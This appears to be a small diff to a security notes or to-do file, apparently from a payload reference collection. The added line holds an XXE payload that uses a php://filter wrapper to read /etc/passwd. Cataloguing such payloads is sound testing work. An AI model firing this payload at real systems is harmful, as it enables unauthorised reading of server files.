@@ -26,3 +26,4 @@
 
 ## Fix in notes
 - GraphQL - Github markdown issue with double curly braces
+- Add `<!DOCTYPE+foo+[+<!ENTITY+xxe+SYSTEM+"php://filter/convert.base64-encode/resource=/etc/passwd">+]><root><name>%26xxe;</name><email>test@test.com</email></root>` to XXE (using php filter to grab file with XXE)
